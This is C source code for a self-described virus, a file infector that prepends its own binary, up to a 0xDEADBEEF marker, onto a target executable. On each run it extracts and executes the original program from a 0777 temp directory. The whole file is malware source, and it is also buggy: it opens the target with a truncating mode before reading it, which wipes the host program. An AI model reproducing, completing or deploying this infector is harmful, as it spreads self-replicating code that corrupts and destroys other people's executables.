#include <unistd.h>
#include <stdio.h>
#include <stdlib.h> 
#include <sys/stat.h>
#include <fcntl.h>

/*
* Executes the file specified by filename.
* If execution fails, prints an error and exits.
*/
int runFile(const char *filename) {
    printf("Running %s\n", filename);
    execv(filename, NULL);
    // If it returns, execv failed
    perror("execv failed");
    exit(EXIT_FAILURE);
}

/*
 * Searches a file for the byte pattern 0xDEADBEEF.
 * Returns 1 if found, 0 otherwise.
 * Seeks to the position immediately after the pattern if found.
 */
long findDeadbeef(FILE *file) {
    printf("Searching for deadbeef pattern in file...\n");
    // Seed to beginning of the file
    if(fseek(file, 0, SEEK_SET) < 0) {
        perror("Could not seek to beginning of file");
        return -1;
    }
    // Search for deadbeef
    unsigned char buffer[4];
    int bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) == sizeof(buffer)) {
        if (buffer[0] == 0xde && buffer[1] == 0xad && buffer[2] == 0xbe && buffer[3] == 0xef) {
            printf("Found deadbeef pattern!\n");
            long currentPos = ftell(file);
            if (currentPos == -1) {
                perror("ftell failed");
                return -1;
            }
            return currentPos;
        }
    }
    printf("deadbeef pattern not found.\n");
    return -1;
}

/*
* Copies content from src file to dest file starting from startPos to endPos
* Returns 0 on success, -1 on failure.
*/
int copyFile(FILE *src, FILE *dest, long startPos, long endPos) {
    // Seek to start position
    if (fseek(src, startPos, SEEK_SET) != 0) {
        perror("fseek failed");
        return -1;
    }

    // Copy content
    unsigned char buffer[1];
    size_t totalBytesRead = 0;
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        if (fwrite(buffer, 1, bytesRead, dest) != bytesRead) {
            perror("fwrite failed");
            return -1;
        }
        totalBytesRead += bytesRead;
        if(totalBytesRead >= (endPos - startPos)) {
            return 0;
        }
    }
    return 0;
}

/*
 * Copies content from src file to dest file starting from startPos to the end of the file
 * Returns 0 on success, -1 on failure.
 */
 int copyEndOfFile(FILE *src, FILE *dest, long startPos) {
    // Find the end of file position
    if(fseek(src, 0, SEEK_END) < 0) {
        perror("Could not seek to end of file");
        return -1;
    }
    long endPos = ftell(src);

    // Copy
    return copyFile(src, dest, startPos, endPos);
 }


/*
 * Infects a file
 */
int infectFile(char *fileToInfectName, char *virusBinName) {
    // Open files
    char *tempFileName = "concatBin";
    FILE *fileToInfect = fopen(fileToInfectName, "wb+");
    FILE *virusFile = fopen(virusBinName, "rb");
    FILE *tempFile = fopen(tempFileName, "ab+");

    // Copy binaries to temp file
    long endOfVirus = findDeadbeef(virusFile);
    if(copyFile(virusFile, tempFile, 0, endOfVirus) < 0) {
        printf("Could not copy virus to temp file\n");
        fclose(fileToInfect);
        fclose(virusFile);
        fclose(tempFile);
        remove(tempFileName);
    }
    printf("Copied virus bin to temp file\n");
    if(copyEndOfFile(fileToInfect, tempFile, 0) < 0) {
        printf("Could not copy infected file to temp file\n");
        fclose(fileToInfect);
        fclose(virusFile);
        fclose(tempFile);
        remove(tempFileName);
    }
    printf("Copied infected bin to temp file\n");

    // Copy temp file to infected file
    if(copyEndOfFile(tempFile, fileToInfect, 0) < 0) {
        printf("Could not copy infected binary back to infected file\n");
        fclose(fileToInfect);
        fclose(virusFile);
        fclose(tempFile);
        remove(tempFileName);
    }
    printf("Copied temp file to infected file\n");

    // Cleanup
    fclose(fileToInfect);
    fclose(virusFile);
    fclose(tempFile);
    remove(tempFileName);
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Virus running\n");
    // Process command line arguments
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <filename>\n", argv[0]);
        return EXIT_FAILURE;
    }
    char *filename = argv[1];
    printf("Source file: %s\n", filename);

    // Open file for reading
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Failed to open file");
        return EXIT_FAILURE;
    }

    // Find deadbeef in file
    long deadbeefPos = findDeadbeef(file);

    // If deadbeef is not found, infect the file
    if(deadbeefPos == -1) {
        printf("infecting file\n");
        infectFile(filename, argv[0]);
        deadbeefPos = findDeadbeef(file);
    }

    // If deadbeef is still not found, there has been an error
    if(deadbeefPos == -1) {
        printf("Could not find deadbeef, even after infecting\n");
        fclose(file);
        return EXIT_FAILURE;
    }
    printf("deadbeef position: %ld\n", deadbeefPos);

    // Make tmp directory if it doesn't exist
    struct stat sb;
    if (!(stat("./tem", &sb) == 0 && S_ISDIR(sb.st_mode))) {
        if (mkdir("./tem", 0777) == -1) {
            perror("Failed to create directory");
            fclose(file);
            return EXIT_FAILURE;
        }
    }

    // Create temporary file
    char *tempFilename = malloc(256);
    sprintf(tempFilename, "./tem/%s", filename);
    printf("Temporary file: %s\n", tempFilename);
    FILE *tempFile = fopen(tempFilename, "wb");
    if (tempFile == NULL) {
        perror("Failed to create temporary file");
        fclose(file);
        free(tempFilename);
        return EXIT_FAILURE;
    }
    if (chmod(tempFilename, 0777) == -1) {
        perror("Failed to set permissions on temporary file");
        fclose(file);
        fclose(tempFile);
        free(tempFilename);
        return EXIT_FAILURE;
    }

    // Copy content from original file to temporary file
    copyEndOfFile(file, tempFile, deadbeefPos);
    fclose(tempFile);
    fclose(file);

    // Execute the temporary file
    runFile(tempFilename);

    return 0;
}